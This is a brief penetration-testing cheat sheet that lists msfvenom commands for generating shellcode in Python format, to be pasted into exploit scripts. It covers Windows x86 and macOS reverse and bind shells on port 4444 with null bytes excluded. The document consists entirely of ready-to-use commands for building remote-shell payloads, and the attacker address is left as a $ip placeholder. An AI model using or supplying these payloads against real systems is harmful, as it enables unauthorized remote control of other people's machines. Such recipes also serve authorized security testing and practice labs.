# Creating Payloads for Python Exploits

**List all payloads**
```
msfvenom -l payloads
```

**Windows x86 Reverse TCP Shell**
```
msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=4444 -b "\x00" -f py
```

**Windows x86 Bind Shell**
```
msfvenom -p windows/shell/bind_tcp LHOST=$ip LPORT=4444 -b "\x00" -f py
```


**Mac Reverse Shell**
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=4444 -b "\x00" -f py
```

**Mac Bind Shell***
```
msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -b "\x00" -f py
```
